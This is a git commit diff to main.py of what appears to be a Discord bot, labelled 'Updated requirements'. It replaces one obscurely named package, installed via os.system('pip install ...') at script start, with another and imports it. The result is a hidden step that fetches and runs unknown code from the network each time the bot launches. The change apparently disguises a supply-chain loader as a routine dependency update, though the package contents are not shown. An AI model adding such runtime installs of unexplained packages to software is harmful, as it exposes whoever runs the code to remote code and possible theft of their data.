fd604bb9806fd3a0f950991f1af6280109d82b60
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 00:49:55 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipsqlpackageV2")
-import pipsqlpackageV2
+os.system("pip install pycoloringpkgsV2")
+import pycoloringpkgsV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
